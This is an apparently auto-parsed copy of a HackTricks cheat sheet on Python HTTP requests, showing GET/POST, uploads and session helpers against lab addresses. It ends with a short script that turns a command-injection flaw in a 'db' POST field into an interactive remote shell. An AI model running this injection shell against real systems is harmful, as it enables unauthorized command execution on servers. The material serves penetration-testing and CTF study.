---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Web Requests

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-generic-methodologies-and-resources-python-web-requests` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/python/web-requests.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

python

## Preserved Body

````markdown
## Python Requests

```python
import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds() 10.231

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
    resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
    return resp

def login(username, password):
    resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
    return resp

def get_info(name):
    resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
    guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
    return guid

def upload(guid, filename, data):
    resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
    guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
    return guid

def json_search(guid, search_string):
    resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
    return resp.json()

def get_random_string(guid, path):
    return ''.join(random.choice(string.ascii_letters) for i in range(10))
```

## Python cmd to exploit an RCE

```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
    prompt = "Inject => "

    def default(self, args):
        output = RunCmd(args)
        print(output)

def RunCmd(cmd):
    data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
    r = requests.post('http://10.10.10.127/select', data=data)
    page = r.text
    m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
    if m:
        return m.group(1)
    else:
        return 1


term = Terminal()
term.cmdloop()
```
````

## Source Verification

[source record](../../sources/hacktricks/web-requests.md)

## Evidence Excerpt

````text
_body: "# Web Requests\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## Python Requests\n\n```python\nimport requests\n\
\nurl = \"http://example.com:80/some/path.php\"\nparams = {\"p1\":\"value1\", \"p2\":\"value2\"}\nheaders = {\"User-Agent\"\
: \"fake User Agent\", \"Fake header\": \"True value\"}\ncookies = {\"PHPSESSID\": \"1234567890abcdef\", \"FakeCookie123\"\
: \"456\"}\nproxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}\n\n#Regular Get requests sending\
\ parameters (params)\ngr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)\n\
\ncode = gr.status_code\nret_headers = gr.headers\nbody_byte = gr.content\nbody_text = gr.text\nret_cookies = gr.cookies\n\
is_redirect = gr.is_redirect\nis_permanent_redirect = gr.is_permanent_redirect\nfloat_seconds = gr.elapsed.total_seconds()\
\ 10.231\n\n#Regular Post requests sending parameters (data)\npr = requests.post(url, data=params, headers=headers, cookies=cookies,\
````
